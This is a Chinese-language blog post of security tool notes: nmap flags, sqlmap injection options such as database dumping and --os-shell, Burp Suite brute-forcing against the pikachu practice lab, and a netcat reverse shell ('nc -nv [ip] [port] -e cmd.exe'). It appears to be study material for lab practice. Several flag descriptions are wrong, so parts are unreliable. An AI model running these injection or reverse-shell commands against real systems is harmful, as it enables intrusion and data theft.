---
title: tools help
date: 2022-01-22 11:32:54
tags:
      - tools
      - 安全
      - nmap
categories:
description:
keywords:
---

# tools 

## nmap

nmap：一款端口扫描工具

使用方法以及参数如下

==在这里$ 代表ip或者url==

> nmap $
>
> - -v:显示详细信息
> - -p:指定端口
>   - -p 80,8080
> - -O:扫描目标是什么操作系统,使用的什么协议
> - -iL 文件:扫描指定文件的ip
> - -V:版本检测 用于扫描目标主机服务版本号. 探测打开的端口以确定服务/版本信息
> - -sA:综合模式扫描
> - -sS:安全模式扫描
> - -sL:list扫描
> - -sT:使用tcp扫描模式
> - -sF:快速扫描
> - -sR:RPC扫描
> - -sn:测试存活主机
> - -U:测试那些udp开放
> - -X:表示以xml的格式输出结果到以文件
> - -P:ping探测
> - -Pn:跳过主机存活扫描过程
> - -P0:ip检测协议是否开启
> - -T:设定模板(越高越快)
>
> 常用
>
> nmap -sS $
>
> nmap -sA -T 4 $



## SQLmap

nginx /etc/nginx/nginx.conf



一款sql注入测试工具



sqlmap -r 文件名

sqlmap -u url或者域名

哪个位置需要进行注入就在哪个位置加==\*==,如下

> sqlmap -u http://localhost/?id=111\*&kkk=aaa

这样就可以对id进行注入了(文件中也一样)

下面是常用命令

>- --dbs:获取所有的数库
>- --current-db:获取当前的数据库
>- --threads 10:开启10个线程
>- --data id=111&password=222:使用post提交,并且表单为id和password
>- --tables -D "库":获取指定数据库的所有表
>- --columns -T "表名称" -D "库名":获取指定库名的表中所有字段
>- --dump -T "表名称" -D "库名" -C "字段":获取指定按照指定的库名表名字段来获取数据库的数据
>- --cookie:使用cookie
>- --file-read"读取的文件夹位置":读取某个文件
>- --file-write "绝对路径":写入文件到某个绝对路径中
>- --batch:自动yes
>- --risk 3:执行测试的风险（0-3，默认为1）risk越高，越慢但是越安全
>- --referer "":使用referer欺骗
>- --user-agent "":自定义user-agent
>- --proxy "目标地址":使用代理注入
>-  -v  详细的等级(0-6)
>            0：只显示Python的回溯，错误和关键消息。
>            1：显示信息和警告消息。
>            2：显示调试消息。
>            3：有效载荷注入。
>            4：显示HTTP请求。
>            5：显示HTTP响应头。
>            6：显示HTTP响应页面的内容
>- --os-shell(需要绝对路径和语言):获取shell



## Burp



是一个数据包捕获软件

首先我们可以设置代理

![image-20220122160622437](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-1.png)

然后去浏览器设置代理以火狐为例子

去设置里面的高级---网络---代理

![image-20220122161034011](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-2.png)

然后安装协议首先访问http://burp

然后下载证书,然后进入设置,高级---证书---证书机构---导入   这样导入证书

![image-20220122161254985](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-3.png)



#### 使用本地的DNS

![image-20220122161507557](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-4.png)



选择这个打开dns服务器,然后就可以使用并看到结果了

![image-20220122161604192](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-5.png)



当我们抓取到数据后就可以进行参数设置,当我们进行post提交的时候有时需要进行编码的调整如:==%00需要被编码否则传输过程中可能会丢失,而且%00进行base64时会被丢失==



![image-20220122162024999](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-6.png)

Send to Intruder和Send to Repeater的时候不能选择东西否则只会进行选择部分的测试



#### 首先介绍一下Send to Intruder    暴力破解

pikaqiu靶场

暴力破解第一题

首先单击请求进行请求

![image-20220119151356569](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-7.png)

然后抓到包后ctrl+i

![image-20220119151545986](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-8.png)



然后进入如下模块并对破解点进行添加

![image-20220119151700990](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-9.png)



![image-20220119154920801](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-10.png)

设置一个type然后进入payloads

![image-20220119155535580](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-11.png)

设置线程数量

![image-20220119155617982](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-12.png)

设置正则获取页面数据

![image-20220119155652450](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-13.png)



单机add设置正则

![image-20220119155849551](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-14.png)



![image-20220119160023712](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-15.png)



设置每次攻击前重新获取token就要进行重定向

![image-20220119160133327](D:\Code\pojo\Blog\BlogHexo\public\img\Tools-16.png)



## nc

一个进行远程命令控制的



黑客电脑的nc运行如下命令

nc -lvp [端口号]



靶机运行如下命令

nc -nv [ip] [端口] -e cmd.exe





>- -l:将nc监听模式运行
>- -k:接受一个请求不会结束而是继续监听





## scapy



构建一个IP数据包



